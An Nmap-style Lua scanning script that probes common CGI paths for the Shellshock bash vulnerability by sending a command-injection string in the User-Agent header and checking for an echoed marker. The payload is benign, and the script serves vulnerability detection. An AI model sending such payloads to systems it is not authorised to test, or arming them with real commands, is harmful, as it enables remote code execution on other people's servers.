local http = require "http"
local stdnse = require "stdnse"

description = [[Tests CGI scripts for the Shellshock (CVE-2014-6271) vulnerability by sending a malicious User-Agent header containing a shellshock payload.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"web", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" end

action = function(host, port)
    local cgi_paths = {"/cgi-bin/test.cgi", "/cgi-bin/test", "/cgi-sys/defaultwebpage.cgi", "/cgi-bin/printenv", "/cgi-bin/"}
    local test_payload = "() { :;}; echo; echo vulnerable"
    local results = {}
    for _, path in ipairs(cgi_paths) do
        local options = {header = {["User-Agent"] = test_payload}}
        local resp = http.get(host, port, path, options)
        if resp and resp.body then
            if resp.body:find("vulnerable") then
                results[#results + 1] = "Shellshock vulnerability confirmed at " .. path
            elseif resp.status and resp.status < 400 then
                results[#results + 1] = "CGI endpoint at " .. path .. " (status " .. resp.status .. ")"
            end
        end
    end
    if #results == 0 then
        return stdnse.format_output(false, "No Shellshock vulnerability detected")
    end
    return stdnse.format_output(true, table.concat(results, "\n"))
end
